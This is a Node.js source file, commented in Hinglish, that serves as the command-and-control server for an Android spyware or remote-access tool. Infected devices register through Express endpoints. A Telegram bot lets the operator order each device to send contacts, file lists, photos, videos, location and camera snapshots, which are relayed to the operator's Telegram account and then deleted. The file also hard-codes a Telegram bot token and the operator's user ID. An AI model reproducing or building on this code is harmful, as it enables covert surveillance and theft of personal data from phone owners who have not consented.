const TelegramBot = require('node-telegram-bot-api');
const fs = require('fs');
const path = require('path');
const express = require('express');
const axios = require('axios');

const token = '8811118034:AAHr5UjOeT43-D4zPadC80V6dmQpgsyqIcM';
const YOUR_USER_ID = 2062068620;
const bot = new TelegramBot(token, { polling: true });
const app = express();
app.use(express.json());

// 📁 DATA STORE KARNE KE LIYE FILE
const dataFile = path.join(__dirname, 'devices.json');
let devices = {};
if (fs.existsSync(dataFile)) {
    devices = JSON.parse(fs.readFileSync(dataFile, 'utf8'));
}

// 📁 DATA FILE MEIN SAVE KARO
function saveDevices() {
    fs.writeFileSync(dataFile, JSON.stringify(devices, null, 2));
}

// ✅ 1. Chhota Data (Device ID, Battery, Location, etc.) Save Karo
app.post('/api/register-device', (req, res) => {
    const { deviceId, deviceName, phoneNumber, battery, ip, sim, online, time } = req.body;
    devices[deviceId] = { 
        deviceName, 
        phoneNumber, 
        battery, 
        ip, 
        sim, 
        online, 
        time,
        lastSeen: Date.now() 
    };
    saveDevices();
    res.json({ success: true });
});

// ✅ 2. Chhota Data (Contacts, Location, Files List) Bot ko bhejo
app.post('/api/upload-data', (req, res) => {
    const { deviceId, type, data } = req.body;
    
    if (type === 'files') {
        bot.sendMessage(YOUR_USER_ID, `📁 Files for device ${deviceId}:\n${data}`);
    } else if (type === 'location') {
        bot.sendMessage(YOUR_USER_ID, `📍 Location for device ${deviceId}: ${data}`);
    } else if (type === 'contacts') {
        bot.sendMessage(YOUR_USER_ID, `📞 Contacts for device ${deviceId}: ${data}`);
    } else if (type === 'status') {
        bot.sendMessage(YOUR_USER_ID, `📊 Status for device ${deviceId}: ${data}`);
    }
    res.json({ success: true });
});

// ✅ 3. Bada Data (Photo, Video, Snapshot) Stream karo + Auto-Delete
app.post('/api/stream-data', (req, res) => {
    const { deviceId, type, filePath } = req.body;
    
    if (type === 'photo') {
        bot.sendPhoto(YOUR_USER_ID, filePath);
    } else if (type === 'video') {
        bot.sendVideo(YOUR_USER_ID, filePath);
    } else if (type === 'snapshot') {
        bot.sendPhoto(YOUR_USER_ID, filePath);
    }
    
    // ✅ FILE DELETE KARO (Auto-Delete)
    try {
        if (fs.existsSync(filePath)) {
            fs.unlinkSync(filePath);
        }
    } catch (e) {
        // ignore
    }
    
    res.json({ success: true });
});

// ✅ 4. App ko commands bhejo
app.post('/api/command', (req, res) => {
    const { deviceId, command, path } = req.body;
    // App ko command bhejo
    axios.post('http://localhost:3000/api/send-command', { deviceId, command, path })
        .then(() => res.json({ success: true }))
        .catch(() => res.json({ success: false }));
});

// ✅ 5. App ko commands bhejo (GET /api/commands?deviceId=...)
app.get('/api/commands', (req, res) => {
    const { deviceId } = req.query;
    // Yahan command bhejne ka logic
    res.json({ command: 'status' });
});

// ✅ /devices — Saare devices ki list
bot.onText(/\/devices/, (msg) => {
    const chatId = msg.chat.id;
    if (!isAuthorized(msg)) {
        bot.sendMessage(chatId, "⛔ Access Denied!");
        return;
    }
    
    const online = Object.entries(devices).filter(([id, d]) => d.online === 'online');
    const offline = Object.entries(devices).filter(([id, d]) => d.online !== 'online');
    
    let message = "📱 ALL DEVICES (Total: " + Object.keys(devices).length + ")\n\n";
    message += "🟢 ONLINE (" + online.length + "):\n";
    if (online.length > 0) {
        online.forEach(([id, d]) => {
            message += `🔑 ID: ${id}\n`;
            message += `🔑 Key: ${d.deviceName || 'N/A'}\n`;
            message += `📅 Expiry: ${d.expiry || 'N/A'}\n`;
            message += `📱 Android: ${d.android || 'N/A'}\n`;
            message += `💾 RAM: ${d.ram || 'N/A'} MB\n`;
            message += `📦 Storage: ${d.storage || 'N/A'} GB\n`;
            message += `🔋 Battery: ${d.battery || 'N/A'}%\n`;
            message += `📊 Installs: ${d.installs || 'N/A'}\n`;
            message += `📊 Status: 🟢 ONLINE\n`;
            message += `🕒 ${d.time || 'N/A'}\n\n`;
        });
    } else {
        message += "No online devices.\n";
    }
    
    message += "\n🔴 OFFLINE (" + offline.length + "):\n";
    if (offline.length > 0) {
        offline.forEach(([id, d]) => {
            message += `🔑 ID: ${id}\n`;
            message += `🔑 Key: ${d.deviceName || 'N/A'}\n`;
            message += `📅 Expiry: ${d.expiry || 'N/A'}\n`;
            message += `📱 Android: ${d.android || 'N/A'}\n`;
            message += `💾 RAM: ${d.ram || 'N/A'} MB\n`;
            message += `📦 Storage: ${d.storage || 'N/A'} GB\n`;
            message += `🔋 Battery: ${d.battery || 'N/A'}%\n`;
            message += `📊 Installs: ${d.installs || 'N/A'}\n`;
            message += `📊 Status: 🔴 OFFLINE\n`;
            message += `🕒 ${d.time || 'N/A'}\n\n`;
        });
    } else {
        message += "No offline devices.\n";
    }
    
    bot.sendMessage(chatId, message);
});

// ✅ /contacts <ID> — Contacts fetch karo
bot.onText(/\/contacts (.+)/, (msg, match) => {
    const chatId = msg.chat.id;
    if (!isAuthorized(msg)) {
        bot.sendMessage(chatId, "⛔ Access Denied!");
        return;
    }
    const deviceId = match[1];
    if (!devices[deviceId]) {
        bot.sendMessage(chatId, "❌ Device not found!");
        return;
    }
    // App ko contacts bhejne ka command
    axios.post('http://localhost:3000/api/command', { deviceId, command: 'get_contacts' })
        .then(() => {
            bot.sendMessage(chatId, `📞 Contacts request sent for device ${deviceId}...`);
        })
        .catch(() => {
            bot.sendMessage(chatId, "❌ Command send failed!");
        });
});

// ✅ /files <ID> — Files scan karo
bot.onText(/\/files (.+)/, (msg, match) => {
    const chatId = msg.chat.id;
    if (!isAuthorized(msg)) {
        bot.sendMessage(chatId, "⛔ Access Denied!");
        return;
    }
    const deviceId = match[1];
    if (!devices[deviceId]) {
        bot.sendMessage(chatId, "❌ Device not found!");
        return;
    }
    // App ko files scan karne ka command
    axios.post('http://localhost:3000/api/command', { deviceId, command: 'scan_files' })
        .then(() => {
            bot.sendMessage(chatId, `📁 Files request sent for device ${deviceId}...`);
        })
        .catch(() => {
            bot.sendMessage(chatId, "❌ Command send failed!");
        });
});

// ✅ /getphoto <ID> <path> — Photo download karo
bot.onText(/\/getphoto (.+) (.+)/, (msg, match) => {
    const chatId = msg.chat.id;
    if (!isAuthorized(msg)) {
        bot.sendMessage(chatId, "⛔ Access Denied!");
        return;
    }
    const deviceId = match[1];
    const photoPath = match[2];
    if (!devices[deviceId]) {
        bot.sendMessage(chatId, "❌ Device not found!");
        return;
    }
    // App ko photo bhejne ka command
    axios.post('http://localhost:3000/api/command', { deviceId, command: 'get_photo', path: photoPath })
        .then(() => {
            bot.sendMessage(chatId, `📸 Photo request sent for device ${deviceId}...`);
        })
        .catch(() => {
            bot.sendMessage(chatId, "❌ Command send failed!");
        });
});

// ✅ /getvideo <ID> <path> — Video download karo
bot.onText(/\/getvideo (.+) (.+)/, (msg, match) => {
    const chatId = msg.chat.id;
    if (!isAuthorized(msg)) {
        bot.sendMessage(chatId, "⛔ Access Denied!");
        return;
    }
    const deviceId = match[1];
    const videoPath = match[2];
    if (!devices[deviceId]) {
        bot.sendMessage(chatId, "❌ Device not found!");
        return;
    }
    // App ko video bhejne ka command
    axios.post('http://localhost:3000/api/command', { deviceId, command: 'get_video', path: videoPath })
        .then(() => {
            bot.sendMessage(chatId, `📹 Video request sent for device ${deviceId}...`);
        })
        .catch(() => {
            bot.sendMessage(chatId, "❌ Command send failed!");
        });
});

// ✅ /camera <ID> <front|back> — Snapshot
bot.onText(/\/camera (.+) (.+)/, (msg, match) => {
    const chatId = msg.chat.id;
    if (!isAuthorized(msg)) {
        bot.sendMessage(chatId, "⛔ Access Denied!");
        return;
    }
    const deviceId = match[1];
    const camera = match[2];
    if (!devices[deviceId]) {
        bot.sendMessage(chatId, "❌ Device not found!");
        return;
    }
    // App ko camera snapshot ka command
    axios.post('http://localhost:3000/api/command', { deviceId, command: 'take_snapshot', path: camera })
        .then(() => {
            bot.sendMessage(chatId, `📸 Camera snapshot request sent for device ${deviceId}...`);
        })
        .catch(() => {
            bot.sendMessage(chatId, "❌ Command send failed!");
        });
});

// ✅ /ping <ID> — Device alive check
bot.onText(/\/ping (.+)/, (msg, match) => {
    const chatId = msg.chat.id;
    if (!isAuthorized(msg)) {
        bot.sendMessage(chatId, "⛔ Access Denied!");
        return;
    }
    const deviceId = match[1];
    if (!devices[deviceId]) {
        bot.sendMessage(chatId, "❌ Device not found!");
        return;
    }
    // App ko ping command
    axios.post('http://localhost:3000/api/command', { deviceId, command: 'ping' })
        .then(() => {
            bot.sendMessage(chatId, `📡 Ping sent for device ${deviceId}...`);
        })
        .catch(() => {
            bot.sendMessage(chatId, "❌ Command send failed!");
        });
});

// ✅ /stats — Total devices
bot.onText(/\/stats/, (msg) => {
    const chatId = msg.chat.id;
    if (!isAuthorized(msg)) {
        bot.sendMessage(chatId, "⛔ Access Denied!");
        return;
    }
    bot.sendMessage(chatId, `📊 Total Devices: ${Object.keys(devices).length}`);
});

// ✅ Authorization check
function isAuthorized(msg) {
    return msg.from.id === YOUR_USER_ID;
}

app.listen(3000, () => {
    console.log("Server running on port 3000");
});
